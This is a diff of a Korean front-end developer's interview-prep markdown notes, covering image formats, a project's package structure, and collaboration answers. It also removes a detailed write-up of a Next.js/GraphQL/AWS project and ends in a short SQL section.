-- 기존에는 개발자 커뮤니티나 카카오톡 오픈채팅방 혹은 유명 개발자들의 블로그 혹은 유튜브 채널을 통해서 확인했었다. 하지만 얼마 전 개발 관련 밋업과 컨퍼런스 등이 있는 것을 알게 되었고 삼성동 코엑스에 넥스트 라이즈 컨퍼런스에 참여했었다. 이런 밋업이나 컨퍼런스 등에 참여를 통해서도 다양한 정보를 얻을 수 있다고 생각한다. 개발자 커뮤니티 혹은 밋업이나 컨퍼런스 등을 적극적으로 활용하면 새로운 기술이나 트렌드 파악에 큰 도움이 된다고 생각한다.
-
-<br>
-
-### # **이미지 포맷의 차이는?**
-
-<br>
-
-- 비트맵 이미지
-
-  픽셀로 표현한 이미지
-
-<br>
-
-- 벡터 이미지
-
-  점과 선의 연결로 표현한 이미지
-
-<br>
-
-- JPG
-
-  비트맵 이미지, 손실 압축, 24비트 컬러 지원
-
-<br>
-
-- PNG
-
-  비트맵 이미지, 비손실 압축, 투명도 지원, 8비트/24비트 컬러 지원
-
-<br>
-
-- WebP
-
-  비트맵 이미지, 구글에서 개발한 이미지 포맷, 손실/비손실 동시 지원, 투명도 지원, 익스플로러에서는 지원하지 않음
-
-<br>
-
-- SVG
-
-  마크업 기반의 벡터 이미지, 해상도로부터 자유롭고 코드 혹은 파일로 사용 가능
-
-<br>
-
-- 동일 화질 파일 크기 비교
-
-  WebP > PNG > JPG
-
-<br>
-
-### # **최근 했던 프로젝트의 패키지 구조에 대해 설명해주세요.**
-
-<br>
-
-- src 디렉토리의 구조는 assets, components, hooks, models, routes, services, states, styles, types 디렉토리로 나누어 사용한다.
-
-  (1) assets : 이미지 혹은 svg를 관리하는 디렉토리이다.
-
-  (2) components : 공통으로 사용되는 컴포넌트를 관리하는 디렉토리이다. routes 내부에 `_shared` 디렉토리와의 차이는 전체적으로 반복해서 재사용하는 컴포넌트들을 관리하는 디렉토리이다.
-
-  (3) hooks : 커스텀 훅을 관리하는 디렉토리이다.
-
-  (4) models : 상수 데이터를 관리하는 디렉토리이다.
-
-  (5) routes : 실제 렌더링되는 컴포넌트들을 관리하는 디렉토리이다. 라우팅 경로를 설정하기도 하고 각 컴포넌트들의 디렉토리를 생성하여 관리한다. 또한 `_shared` 디렉토리를 생성하여 전체 페이지에 렌더링되는 헤더, 푸터, 네비게이션과 같은 컴포넌트들을 관리한다.
-
-  (6) services : api 호출 함수를 관리하는 디렉토리이다.
-
-  (7) states : 전역으로 관리하는 state를 관리하는 디렉토리이다.
-
-  (8) styles : 공통으로 사용되는 스타일을 관리하는 디렉토리이다.
-
-  (9) types : 공통으로 사용되는 타입을 관리하는 디렉토리이다.
-
-<br>
-
-### # **구글 어낼리틱스(GA)**
-
-<br>
-
-- 구글 어낼리틱스는 방문자의 데이터를 수집하여 온라인 비지니스의 성과를 측정하고 개선하기 위해 사용하는 것으로 알고 있다. 직접 사용해본 적은 없지만 구글 어낼리틱스를 적용하는 동영상을 본 경험은 있다.
-
-<br>
-
-### # **어려운 일을 마주했을 때 어떻게 해결하는지?**
-
-<br>
-
-- 상황에 따라 다르게 해결할 것 같다. 우선 프로젝트 일정에 차질이 생기지 않는 선에서 최대한 혼자서 해결하고 만약 사수분이 계시고 혼자 해결하는 시간이 길어질 것 같다고 판단되는 경우 질문할 것 같다. 여기서 질문은 구체적으로 한번에 답변을 받을 수 있도록 좋은 질문을 하는 것이 중요한 포인트라고 생각한다. 만약 사수분이 계시지 않고 혼자 해결하는 시간이 길어질 것 같다고 판단되는 경우 미리 팀장님께 보고를 드려 해결책을 강구할 것 같다.
-
-<br>
-
-### # **백엔드 개발자와 작업을 하는 데 서로 생각이 다를 때 어떻게 할거냐? 수긍? 설득?**
-
-<br>
-
-- 서로에 의견을 다를 경우 그만한 이유가 있을 것이라고 생각하기 때문에 무조건 적으로 수긍하거나 설득하지는 않을 것 같다. 만약 시간이 가능하다면 두 가지의 방법 모두 적용시켜보고 퍼포먼스 최적화에 더욱 도움이 되는 쪽으로 선택할 것 같다. 시간이 가능하지 않다면 백엔드 개발자분과 둘이서 결정하는 것이 아닌 팀원들과 협의해서 결정하거나 서칭을 통해 해당 이슈에 대해 더 알아보고 결정할 것 같다.
-
-<br>
-
-### # **백엔드와 협업하면서 어려웠던 점**
-
-<br>
-
-- 카카오 로그인 api를 활용하여 소셜 로그인 기능을 구현했었던 적이 있었는데 당시 백엔드 개발자분의 재택 작업으로 인해 소통의 부재가 생겼었다. 그래서 소통의 오류로 이어지게 되었는데 프론트엔드 단과 백엔드 단 모두에서 소셜 로그인 기능을 구현하는 중복 작업의 문제가 발생하게 되었다. 그 때 프론트엔드 개발자와 백엔드 개발자 간에 소통의 중요성을 느끼게 되었고 개발 과정 중에 백엔드 개발자분과의 적극적인 소통은 정말 필수적으로 해야한다고 느꼈다.
-
-<br>
-
-### # **프로젝트 미완성 부분 아쉬움이 있었는지? 있다면 무엇이었는지?**
-
-<br>
-
-- 클래스101을 레퍼런스로 작업했던 낫파운드 404라는 프로젝트가 있는데 이 프로젝트에 크레이터 페이지가 미완성되었다. 크레이터 페이지는 사용자가 직접 클래스를 등록하여 다른 사용자가 해당 클래스에 신청하여 참가할 수 있게 하는 기능을 제공하는 페이지인데 프로젝트 설계 당시 프로젝트 진행 기간을 고려하여 클래스를 만드는 과정까지만 구현하기로 했었다. 하지만 해당 페이지를 담당했던 프론트엔드 개발자분이 진행하는 부분에 대해 착각하여 볼륨을 너무 크게 잡게 되어 결국 미완성하게 되었다. 이 부분은 소통의 오류로 인해 발생한 문제이기 때문에 팀원 모두에 잘못이라고 생각한다. 개발자에게 소통이 왜 중요한 것인지 다시 한번 느낄 수 있었다.
-
-<br>
-
-### # **본인이 작성한 코드 중 자신있는 코드를 보여주세요.**
-
-<br>
-
-- 지금 당장 생각나는 코드는 매드업이라는 프로젝트에 테이블 부분이 생각난다. 개인적으로 렌더단과 로직단을 최대한 구분하는 것이 중요하고 렌더단은 가독성을 최대한으로 끌어올려 페이지 구조를 한 눈에 파악할 수 있어야한다고 생각하는데 이 부분에서 (POB_Madup -> src -> routes -> DashBoard -> MediaStatus -> MediaTable -> MediaTable.tsx) 유즈메모를 사용하여 렌더단에서 페이지 구조를 파악하기 쉽도록 잘 설계한 것 같다고 생각한다.
-
-<br>
-
-### # **구체적인 질문이란?**
-
-<br>
+### # 구체적인 질문이란?
 
 - 주고 받는 질답의 형식보다는 한번에 질문을 통해 답변을 받을 수 있도록 정리되어 있는 질문이 좋은 질문이라고 생각한다.
 
@@ -11865,157 +12255,11 @@ function GenericReturnFunc<T>(arg: T): T {
 
 <br>
 
-### # 메인 프로젝트 - 매치아크
-
-- 서비스 소개 : 잉글랜드 9부 리그 이하 아마추어 클럽과 플레이어를 매칭시켜주는 서비스
-
-- 기술스택 : Next.js, Typescript, Apollo Client, GraphQL, BaseUI, Styletron-react, Vercel, next-pwa, react-hook-form, AWS S3, AWS Cloudfront, AWS Lambda, analytics/amplitude
-
-- 프로젝트 아키텍처 : 프론트는 react 기반 프레임워크인 nextjs를 활용했고 서버는 nodejs 기반 프레임워크인 nestjs를 활용했다. db는 mysql을 사용했다. 또한 캐시 서버인 redis를 사용했다. 그리고 파일 서버로 aws s3를 사용했고 cloudfront와 함께 사용했다. 그리고 유저가 이미지 업로드 시 aws lambda를 통해서 이미지를 리사이징하였고 S3 파일 서버에서 이미지 제공 시 리사이징된 이미지를 제공하였다. 또한 프론트 배포 및 ci/cd 구축은 vercel을 사용하였다. 백엔드 배포는 도커를 통해 도커라이징하여 이미지 생성 후 해당 이미지를 ec2를 통해 배포하였다.
-
-- 페이지별 기능 구현 방법
-
-  - 공통
-
-    - 빌드 및 배포 : 프론트 웹은 버셀을 활용하여 적용하였다. 버셀을 활용하는 경우 CI/CD가 자동으로 적용되기 때문에 PR 생성 시 빌드 및 테스트를 자동화할 수 있었고 연결된 레파지토리 메인 브랜치에 머지 시 자동으로 배포할 수 있었다. 또한 앱의 경우 next-pwa와 bubble wrap을 활용한 안드로이드 apk 파일 빌드 후 배포하였다.
-
-    - UI 구현 : UI 프레임워크는 BaseUI를 사용하였고 CSS 라이브러리는 css-in-js인 Styletron-react를 활용하였다. 자주 묶어서 사용되는 flex, font와 같은 스타일의 경우는 스타일 객체를 반환하는 유틸 함수로 생성하여 공통적으로 사용하였다. styletron-react를 사용한 이유 중 가장 큰 이유는 SSR에 최적화되어있다. 서버 사이드 렌더링 시 HTML에 스타일 태그 내부에 각 스타일을 유일한 클래스로 지정하고 각 태그마다 필요한 클래스를 할당하여 클라이언트로 보낸다. 개발자 도구 네트워크 탭에서 페이지 로드 시 전달받은 도큐먼트 프리뷰를 확인해보면 클래스를 할당하여 보내는 것을 볼 수 있다. 또한 아토믹 CSS 방식을 채택하여 사용하기 때문에 각 스타일이 유일한 클래스로 지정되어 중첩된 스타일 시트를 방지하며 스타일 적용 시 자동으로 클래스가 부여된다.
-
-    - Typescript 활용 : Typescript를 활용한 정적 타이핑으로 안정성 향상시켰다.
-
-    - AWS S3와 Cloudfront 활용 : AWS 파일 서버인 S3를 활용하여 유저 업로드 이미지나 비디오를 관리하였고 AWS의 CDN인 Cloudfront를 활용하여 가까운 리전(지리적 분포 서버)의 엣지 서버에서 데이터를 제공해주어 빠르게 데이터가 제공되도록 하였다.
-
-    - GraphQL 활용 : Apollo Client, GraphQL을 활용한 데이터 패칭 및 캐싱을 통해 데이터 오버 패칭이나 언더 패칭을 해결하고 API 호출을 최적화하였다. 또한 로컬 스키마를 생성하고 캐싱하여 전역 상태 관리 라이브러리를 대체하여 사용하였다. (설명 : 쿼리를 생성 후 코드제너레이터를 돌려서 로컬 및 리모트 스키마에 대한 타입을 생성한 뒤 쿼리 도큐먼트를 아폴로 클라이언트에 useQuery 혹은 useMutation의 인자로 활용하여 api를 요청하였다. REST API에 비해 필요한 데이터만 적절히 요청해서 데이터 오버 패칭이나 언더 패칭이 없고 캐싱도 가능해서 편리하게 사용했던 것 같다. 캐싱의 경우 writeQuery, readQuery, modify 메소드를 활용하여 캐싱 데이터를 관리하였다.)
-
-    - SSG를 활용한 조건부 UI 처리 : getStaticProps를 활용한 header, bottom navigation 등 조건부 UI 핸들링 및 페이지 접근 권한 처리, 접근 권한 없는 경우 대체 페이지 노출하였다. 초기 값은 app 디렉토리에 컴포넌트의 props로 내려주고 이 props를 빌드 타임에 업데이트 시키는 방식으로 구현하였다.
-
-    - Skeleton UI 적용 : 사용자 경험 향상 및 layout shift 방지를 위한 Skeleton UI 적용하였다. if문 혹은 삼항 연산자 등을 활용하여 패칭 된 데이터가 유효하지 않은 경우 대체 UI로 제공하였다. 이 부분에서 스켈레톤 UI를 컴포넌트 단위로 적용한 점에서 아쉬운 것 같다. 전체 페이지의 데이터가 로드될 때 까지 스크롤 없는 스켈레톤 UI를 적용한다면 사용자 경험이 더 좋아졌을 것 같다.
-
-    - Code splitting 적용 : 다이나믹 임포트를 활용한 코드 스플리팅 적용, 기본적으로 next js에서는 페이지 디렉토리 내의 페이지들은 자동 코드스플리팅을 적용하기 때문에 그 외에 페이지 디렉토리 외부에 있는 공통 컴포넌트를 사용하는 경우 다이나믹 임포트를 통해 코드 스플리팅을 적용시켰다.
-
-    - REST API 공통 herders 관리 : REST API 사용 시 Interceptor를 활용한 Content-type 및 Authorization 등 공통 headers 메타 데이터 관리하였고 switch 문과 같은 추가적인 내부 로직을 사용하여 토큰이 필요한 요청의 경우 토큰을 심어주고 기타 다른 추가 데이터가 필요한 요청 등을 묶어서 관리하였다. (ex window.fetch = () = { … })
-
-    - Context API과 HOC를 활용한 전역 상태 관리 : Context API 커스텀 훅을 활용한 로그인, 모달, 토스트 관련 전역 상태 관리하였다. 구현 방법은 재사용 가능한 Context API 훅을 만들고 제네릭 타입을 할당한 뒤 Context의 값과 프로바이더를 배열로 반환하도록 하였다. 그 후 app 디렉토리 내부 컴포넌트를 감싸는 전역 상태 관리를 담당하는 고차 컴포넌트 내부에서 해당 Context API 훅을 사용하는데 이 때 제네릭 타입의 인자로 전역 state로 사용할 state들을 interface 타입으로 묶어 전달하여 프로바이더가 관리할 값의 타입을 지정하였다. 그 후 고차 컴포넌트 내부에서 로그인, 로그아웃 등 필요 조건에 따라 전역적으로 사용되는 state를 업데이트하였고 이 state를 Context API 훅이 반환하는 프로바이더의 value로 넘겨주어 프로바이더가 최신 값을 반환할 수 있게 하였다. 여기까지 프로바이더가 반환하는 값의 세팅을 마친 후 고차 컴포넌트 내부에 있는 Context API 훅이 반환하는 Context의 값을 export 하여 모든 컴포넌트에서 import로 해당 state를 참조할 수 있게 하였다.
-
-    - HOC를 활용한 Provider 래핑 : app 디렉토리 내부에 여러 프로바이더 연결 시 props로 인해 가독성이 저하될 수 있는데 각 프로바이더를 HOC 만들고 래핑하여 가독성이 향상되도록 하였다.
-
-    - SVG 컴포넌트 활용 : SVG 재사용성을 증가시키기 위해 @svgr/webpack 패키지를 활용하여 컴포넌트로 사용하였다. svg 파일을 컴포넌트 내부로 import 할 때 컴포넌트 형태로 import 할 수 있다.
-
-    - SEO 향상을 위한 동적 메타 태그 적용 : next-seo를 활용하여 기본 메타 태그 및 페이지 별 동적 메타 태그 적용
-
-    - Next API Routes 활용 : Next API Routes를 활용한 Apply/Offer API, Apply/Offer 시 필요한 JWT 발급 및 검증 API, S3 파일 업로드 API 생성 및 유저 거주 지역의 좌표를 가져오는 외부 API 주소 마스킹 처리 등을 하였다. 페이지 디렉토리 내부 api 디렉토리에 생성하고 해당 파일의 경로를 api url로 사용하여 호출하였다. (ex /api/jwtSign/)
-
-    - Debounce 적용 : 사용자 입력을 통한 API 요청 시 Debounce를 적용하여 API 호출 횟수 최적화하였다. lodash에 debounce를 사용하였다. 사용법은 debounce로 콜백 함수를 인자로 넘겨주기만 하면 된다. (ex debounce(() => {}))
-
-    - useMemo, useCallback 활용 : 연산이 비용이 큰 값 혹은 함수의 경우 useMemo, useCallback을 활용한 메모이징하였다. 예를 들어 검색 페이지에 경우 클라이언트에서 처리 시 연산이 매우 컸는데 이러한 경우 메모이징하여 사용하였다.
-
-    - userAgent를 활용한 조건부 모달 노출 : 지원하지 않는 브라우저의 경우 userAgent를 활용한 경고 모달 노출, 점진적으로 대응하여 제거된 기능이지만 사파리 브라우저를 사용하는 빈도가 적었기 때문에 이러한 방식으로 대응하였었다.
-
-    - Mailchimp API 사용 : Mailchimp API를 활용한 유저 Offer, Apply 시 알림 메일 발송
-
-    - 웹 접근성 향상을 위한 aria 속성 및 alt 속성 활용 : 스크린 리더 사용자들을 위한 aria-label, aria-labelledby, aria-disabled 등의 속성 활용 및 이미지 태그의 alt 속성 활용
-
-    - OG Tag 적용 : 서비스 공유 및 마케팅 효과 향상을 위한 OG tag 적용 (ex `<meta property="og:url" content=https://${NEXT_PUBLIC_DOMAIN}.com>`, `<meta property="og:image" content=https://${NEXT_PUBLIC_DOMAIN}.com/images/>static/og-image.png>`)
-
-    - 사용자 행동 추적 및 분석 : Amplitude의 analytics 활용 및 useAnalytics hook을 활용한 사용자 행동 추적
-
-    - ESLint : ESLint를 활용한 Airbnb 스타일 룰 적용 및 Airbnb javascript 스타일 가이드 참조
-
-  - 메인 페이지
-
-    - ISR을 활용한 정적 페이지 업데이트 : 빌드 타임에 getStaticProps로 패칭한 Apply/Offer 카운트, 방금 가입한 유저 목록 데이터 등을 업데이트 하기 위해 revalidate 속성을 활용한 정적 페이지 재생성하였다. getStaticProps의 revalidate 속성을 활용하였다. 빌드 주기는 60초로 설정했었다.
-
-    - 외부 링크 이동 시 새창 열림 : 외부 링크 이동 시 target 속성의 `_blank`를 활용한 새창 열림으로 사용자 경험 향상시켰다.
-
-  - 검색 페이지
-
-    - Google Map API 활용 : Google Map API를 활용한 좌표 추출 및 좌표를 활용한 마커 및 마커 클러스터 표시, 마커 클릭 시 해당 좌표를 가진 유저 카드 노출
-
-    - Query String을 활용한 필터 처리 : Query String을 활용한 검색 결과 필터 처리 및 사용자들간 URL을 통한 필터 결과 값 공유로 사용자 경험 향상
-
-    - 캐싱을 활용한 세부 옵션 값 유지 : GraphQL 로컬 스키마 생성 및 캐싱을 활용하여 페이지 전환 후 되돌아오는 경우 세부 옵션 사항 유지하였다. 예를 들어 유저 상세 옵션을 지정하고 유저 상세 페이지를 본 뒤 다시 검색 페이지로 돌아왔을 때 세부 옵션 값이 유지되도록 하였다. 세부 옵션 값을 유지하는 조건은 페이지 히스토리를 체크하여 이전 페이지가 유저 상세 페이지인 경우에만 유지되도록 하였다.
-
-    - Windowing 기법 적용 : 유저 카드 목록에 react-cool-virtual 패키지를 활용한 windowing 기법 적용으로 렌더링 최적화하였다. react-cool-virtual의 useVirtual hook이 반환하는 OuterRef와 InnerRef를 윈도우윙에 적용시킬 DOM에 ref와 연결하여 구현하였다.
-
-  - 유저 상세 페이지
-
-    - 주소 공유 기능 구현 : navigator.clipboard.writeText을 활용한 URL Copy 기능 구현
-
-    - 동적 페이지 SSR 적용 : getStaticPath fallback 속성을 blocking 으로 설정하여 사용자가 프리 렌더되지 않은 동적 페이지에 접근 시 SSR로 페이지를 제공하고 캐싱하여 이후 접근 시에는 캐싱된 페이지를 제공하도록 하였다.
-
-  - 포스트 상세 페이지
-
-    - 포스트 비디오 구현 : react-player의 ReactPlayer를 활용한 비디오 구현 및 마우스 혹은 키보드 입력에 따른 비디오 액션 커스텀, 아쉽게도 머지되지 않았다. 리액트플레이어 컴포넌트의 파라미터인 onReady, onProgess와 같이 비디오가 준비 되었을 때, 비디오가 실행 중일 때 등의 조건이나 비디오의 시간을 제어할 수 있는 seekTo 메소드 등을 이용하여 구현하였다.
-
-    - 프로필 업데이트 구현 : react hook form을 활용하여 프로필 업데이트 페이지 구현, FormProvider와 useFormContext을 활용한 프로필 step 별 form 데이터 일괄 업데이트하였다. 단일 페이지의 form의 경우 useForm의 control으로 컨트롤러를 해당 폼에 등록하여 사용하고 FormProvider로 외부를 래핑한 후 별도의 컴포넌트 등에서 useFormContext을 통해 해당 form에 현재 상태를 조회하고 Controller로 해당 form을 업데이트 시킬 수 있게 하였다. 또한 form의 상태는 watch(컨트롤러에 작성 중인 값), resetField, getValues(폼에 저장된 값을 가져옴), setValue, formState의 dirtyFields, isValid, isDirty, errors 등을 통해 핸들링하였다.
-
-    - AWS Lambda를 활용한 이미지 리사이징 : AWS S3에서 유저가 썸네일 혹은 포스트 이미지 업로드 시 AWS lamdba를 활용하여 이미지 리사이징 후 요청 시 해당 리사이징 파일 제공 -> 이미지 리사이징 방법이 개선되어야 할 것 같다. 리사이징 이미지를 생성해서 S3에 저장한 후 제공하는 것이 아닌 이미지 요청 시 리사이징 이미지를 생성해서 제공하는 방법도 있다. 해당 방식을 사용하면 S3에 원본만 저장하면 되기 때문에 더 효율적으로 관리가 가능하다.
-
-    - 스크롤 이벤트 최적화 : 포스트 상세 페이지의 풀페이지 기능에 적용 된 스크롤 이벤트 트리거 시 메모리 누수 방지를 위한 클린업 처리 및 throttling 적용으로 이벤트 호출 최적화, lodash의 thottle 사용, useEffect의 경우 return으로 클린업 처리
-
-  - 채팅 페이지
-
-    - getStream.io API를 활용한 채팅 페이지 구현, 채널 연결 시도 시 토큰 발급 후 채널 연결, 채팅방 나가는 경우 채널 연결 해제, 채팅 채널 개수 제한, 스타일 커스텀 등의 기능 구현
-
-  - 로그인 페이지
-
-    - 회원 가입 페이지 구현 : react-hook-form의 useForm, useFormContext, Controller 등을 활용한 회원 가입 페이지 구현
-
-    - 일반 로그인 구현 : JWT 토큰 기반 인증 방식을 활용한 일반 로그인 기능 구현, 액세스 토큰은 로컬 스토리지에서 관리하였으며 리프레쉬 토큰은 쿠키로 관리하였다. 액세스 토큰 만료 시 리프레쉬 토큰을 활용하여 재발급 받았다. 로그인 API 요청이 완료된 후 로컬 스트로지에 액세스 토큰을 저장하고 리프레시 토큰은 set-Cookie로 응답 헤더에 포함되어 쿠키에 저장되었다. 그 후 app 디렉토리 내부에 래핑 된 인증 관련 HOC 내부에서 state를 생성하여 관리하였다.
-
-    - 소셜 로그인 구현 : Oauth2 방식으로 소셜 로그인 구현 (설명 : Oauth2 방식으로 구현, 소셜 로그인 버튼 클릭 시 ${process.env.NEXT_PUBLIC_MATCHARK_API_ENDPOINT}/auth/apple 과 같은 소셜 아이디 로그인 페이지로 리다이렉트 -> 소셜 아이디 로그인 후 서버에서 빈 화면인 verify/sns?key=… 페이지로 인증 key를 담아서 리다이렉트 -> 빈 화면인 verify/sns?key… 페이지에서 useEffect를 통해 쿼리 파라미터에 담긴 key를 사용하여 사용자 인증 API 요청, 해당 사용자 인증 API는 이미 존재하는 유저인지 확인하여 boolean 값 응답, 존재하지 않는 다면 바로 쿼리 파라미터의 key를 활용하여 자동 회원가입이 되는 로그인 API 요청 -> 이미 존재하는 유저인 경우 로그인 타입을 소셜 타입으로 변경할 지 물어보는 모달 노출 및 확인 시 자동 로그인 타입이 변경되는 로그인 API 요청 -> 요청 완료 후 메인 페이지로 리다이렉트)
-
-  - 프로필 수정 페이지
-
-    - 프로필 수정 페이지 구현 : react-hook-form의 useForm, useFormContext, Controller 등을 활용한 프로필 수정 페이지 구현
-
-    - 프로필 이미지 업로드 : 사용자 프로필 이미지 업데이트 시 이미지 영역에 맞는 크기의 이미지로 리사이징 후 업로드하여 이미지 최적화, 사용자가 업로드 시도 시 해당 이미지에 블랍을 전달받고 createObjectURL로 임시 URL 생성한다. 그 후 createElement로 이미지 엘리먼트 생성 후 해당 엘리먼트의 src 어트리뷰트로 해당 임시 URL을 지정해준 뒤 해당 엘리먼트의 load 이벤트 리스너를 걸어 이미지 로드가 완료되면 캔버스를 통해 새로 이미지를 그린 후 해당 이미지의 Blob을 만들어 사용했다. 업로드 과정은 AWS-SDK를 활용하여 생성한 S3 객체 createPresignedPost 메소드로 파일을 업로드하고 업로드 URL을 DB에 저장하였다.
-
-    - 포스트 업로드 구현
-
-      - 업로드 파일 사이즈 체크 : 포스트 업로드 시 blob을 활용하여 format, size 체크 후 경고 토스트 노출 및 업로드 진행
-
-      - 업로드 시 미리보기 제공 : 포스트 업로드 시 이미지 및 비디오를 분기 처리하여 이미지인 경우 createObjectURL을 활용한 미리보기 생성 및 노출, 비디오인 경우 썸네일 생성 후 video, canvas를 활용한 미리보기 생성 및 노출하였다.
-
-      - 포스트 업로드 구현 : AWS-SDK를 활용하여 생성한 S3 객체 createPresignedPost 메소드를 활용하여 presigned URL 방식을 활용한 포스트 이미지 업로드를 구현하였고 포스트 비디오 업로드의 경우 abortMultipartUpload 메소드를 활용하여 Multiipart Upload 방식을 활용한 포스트 비디오 업로드를 구현하였다. 또한 업로드 시 useMutaion을 활용하여 DB에는 해당 포스트에 대한 정보를 함께 저장하였다.
-
-      - 포스트 삭제 구현 : Next API routes를 활용하여 AWS S3에 해당 포스트를 삭제하는 API 생성, aws-sdk 패키지의 AWS 객체로 AWS 클라이언트를 생성하고 해당 객체 내부에서 S3 클라이언트, 클라우드프론트 클라이언트를 각각 생성하였다. 그 후 생성한 S3 클라이언트를 통해 S3 객체를 생성하는데 인증 액세스 키와 인증 시크릿 키를 함께 전달하여 생성한다. 그 후 S3 객체의 deleteObject 메소드의 파라미터로 버킷 이름과 이미지 URL을 넘겨주어 삭제한다.
-
-    - 캐싱을 활용한 경고 모달 노출 : GraphQL 로컬 스키마 생성 및 캐싱을 활용하여 프로필 수정 중인 경우 경고 모달 노출, 프로필 수정 페이지에서 사용하는 useForm의 isDirty가 true가 되는 경우 로컬 스키마로 생성한 사용자 입력 수정 중임을 나타내는 boolean 값을 true로 업데이트하여 캐싱한 후 사용자가 페이지 벗어나려고 하는 경우 cache-only를 통해 해당 값을 체크하여 경고창을 노출
-
-  - 비밀번호 재설정 페이지
-
-    - SSR을 활용한 동적 쿼리 접근 : 비밀번호 재설정 페이지의 경우 유저에게 확인 이메일을 보낸 후 해당 이메일 내의 버튼을 이용하여 비밀번호 재설정 페이지로 접근하는데 이 때 쿼리 스트링에 컨펌 토큰을 포함해서 접근하게 된다. 이 토큰은 매 요청 시 변하는 해쉬 값이기 때문에 동적 쿼리 스트링을 받아올 수 없는 getStaticProps 대신 getServerSideProps를 사용하였다. 만약 사용자가 페이지 접근 시 쿼리 스트링에 토큰이 포함되어 있지 않은 경우 해당 페이지에 접근을 막고 대체 페이지를 제공해주기 위해 getServerSideProps의 파라미터로 쿼리에 담긴 토큰을 받아 검증 후 대체 페이지가 노출되도록 하였다. useEffect가 아닌 getServerSideProps를 사용한 이유는 useEffect는 컴포넌트 마운트 후 실행되기 때문에 잠시동안 사용자가 페이지를 볼 수도 있기 떄문에 getServerSideProps를 사용하였다.
-
-- 프로젝트에서 기술적으로 어려웠던 점과 해결 방법에 대해 설명해주세요. (작성 중)
-
-  - 기술적으로 어려웠던 상황은 구체적으로 생각나는 것은 없는 것 같습니다. 다만 처음 입사하여 온보딩 시 Nextjs, GraphQL, baseUI, styletron-react, react-hook-form 등 사용해보지 않았거나 현업에서 적용하는 것이 처음이었던 라이브러리들이 상당히 많았기 때문에 한꺼번에 많은 내용을 숙지해야하는 상황에 놓였었습니다. 그렇기 때문에 회사에서는 온보딩 과정을 3~6주 정도 가지며 천천히 적응하길 원하셨습니다. 하지만 저는 1주 정도의 온보딩 과정을 거친 후 바로 프로젝트에 투입되어 간단한 작업부터 처리해보는 것이 프로젝트 적응에 있어 더 큰 도움이 될 것이라고 생각하여 해당 사항을 회사에 요구하였고 회사에서는 제 요구를 받아들여 바로 간단한 작업들을 처리할 수 있도록 해주셨습니다. 그 결과로 회사에서 생각했던 기간보다 더 빠르게 프로젝트에 투입되어 성공적으로 적응할 수 있었습니다.
-
-- 프로젝트에서 협업은 어떤 식으로 진행하셨나요?
-
-  - 환경 변수 공유 및 디자인 시스템, 화면정의서 등은 컨플루언스를 통해 공유하였고 기능 개발 시 스프린트 기간을 설정해두고 티켓 별로 나누어 개발하였는데 이 때 지라를 통해 티켓을 관리했었습니다. 또한 GraphQL 테스트는 플레이그라운드를 사용했고 REST API 테스트는 스웨거를 사용했습니다. 또한 PR은 기능 단위로 PR을 올렸으며 커밋은 개발자 별로 자유롭게 하되 잘게 쪼개는 방식을 사용했었습니다. 또한 커밋 메세지 컨벤션은 지라의 티켓 번호와 연동되도록 작성하였고 프리픽스로 feat, fix, docs, reafactor 등을 사용했습니다. 그리고 데일리 미팅과 위클리 미팅을 통해 작업 내용 및 이슈 사항을 공유하였습니다. 코드 리뷰는 PR 코멘트로 진행되었습니다. 또한 프로젝트 빌드 및 배포는 사수 개발자 분이 담당하셨으며 그 외 업무는 차등을 두지 않고 나누어 작업하였습니다.
-
-- 프로젝트에서 아쉬웠던 부분에 대해 설명해주세요.
-
-  - 검색 결과 필터 시 클라이언트에서 모두 처리 : 또한 유저 검색 기능 중 필터 처리에 대한 아쉬움이 있습니다. 유저 검색 기능 중 필터 처리를 통해 유저를 필터링 하는 로직이 있었는데 해당 부분을 프론트 단에서 모두 처리하다보니 필터 처리 후 유저 목록 및 구글 맵 마커 노출이 늦는다는 단점이 있었습니다. 해당 부분을 필터 요청 시 API를 통해 필터 처리 된 목록을 요청하는 방식으로 변경한다면 더 빠르게 처리가 가능할 수 있을 것이라는 생각이 들었습니다.
-
-  - 포스트 디테일 윈도우윙 미적용 : 포스트 디테일 페이지에 윈도우윙 기법을 적용하지 못한 아쉬움이 있습니다. 검색 페이지에서는 윈도우윙이 적용되어 사용자에게 노출되는 부분만 유저 목록이 렌더링 되도록 최적화가 되어있었는데 포스트 디테일 페이지에서는 윈도우윙이 적용되지 않아 불필요한 컨텐츠들이 모두 렌더링된다는 문제점이 있었습니다. 해당 부분에 윈도우윙 기법이 적용되었다면 렌더링 최적화에 도움이 되었을 것이라고 생각됩니다.
-
-  - 스타일 린트 미사용 : 스타일 컨벤션에 관한 아쉬움이 있었습니다. 컴포넌트를 스타일링할 때 스타일 속성 순서를 정해놓지않고 스타일링하였는데 개인 작업에서는 항상 가독성 향상을 위해 속성의 순서를 정해놓고 스타일링을 하였습니다. (모질라에서 제안한 CSS속성 기술 순서 : display(객체의 노출여부/표현방식), list-style, position(위치/좌표), float, clear, width/height(크기/여백), padding/margin, border/background(윤곽/배경), color/font(글자/정렬), text-decoration, text-align/vertical-align, white-space, other text, content (내용))
-
-  - 외부 폰트 사용 시 그대로 사용 : 외부 폰트 사용 시 폰트를 그대로 사용했었는데 불필요한 글자를 제거한 서브셋 폰트를 사용하였다면 폰트 경량화가 가능했을 것 같습니다.
-
-  - 스켈레톤 UI 적용 시 컴포넌트 별 적용 : 컴포넌트 별로 적용하는 것보다 전체 페이지에 대해 적용시키는 것이 사용자 경험에 더 좋을 것 같다.
-
-<br>
-
 ## # SQL
 
 <br>
 
 ### # 테이블 조회 기본
-
-<br>
 
 - SELECT 컬럼명 FROM 테이블명
 
